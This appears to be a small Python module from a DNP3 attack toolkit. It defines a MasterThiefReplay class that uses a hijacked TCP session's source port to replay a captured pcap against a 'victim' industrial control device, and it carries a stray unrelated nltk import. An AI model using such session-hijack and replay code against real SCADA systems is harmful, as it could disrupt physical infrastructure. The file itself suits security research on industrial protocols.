from nltk.classify.rte_classify import ne

__author__ = 'Nicholas Rodofile'

from master_thief import *
from DNP3_Replay import *
from DNP3_Node import *
from scapy.all import IP, TCP

class MasterThiefReplay(MasterThief):
    def __init__(self, victim, pcap):
        MasterThief.__init__(self, victim)
        self.pcap = pcap

    def connect(self):
        if not self.running_master:
            self.running_master = True
            self.master = DNP3_Replay(self.victim, self.injection[TCP].sport, self.pcap)
            self.master.address_conf(self.injection[DNP3])
            self.master.start()
